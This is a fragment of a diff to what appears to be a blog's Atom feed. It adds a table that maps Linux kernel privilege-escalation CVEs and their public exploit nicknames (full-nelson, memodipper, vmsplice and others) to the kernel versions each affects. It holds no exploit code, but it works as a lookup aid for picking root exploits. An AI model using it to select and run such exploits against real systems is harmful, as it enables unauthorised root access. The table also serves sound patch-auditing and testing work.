+CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)
+CVE-2013-1858 [clown-newuser] (3.3-3.8)
+CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)
+CVE-2013-0268 [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)
+CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)
+CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)
+CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)
+CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)
+CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)
+CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)
+CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)
+CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)
+CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)
+CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)
+CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)
+CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)
+CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)
+CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)
+CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)
+CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)
+CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)
+CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)
+CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)
+CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)
+CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)
+CVE-2004-1235 [elflbl] (2.4.29)
+CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)
+CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)
+</code></pre>
+]]></content>
+    </entry>
 </feed>
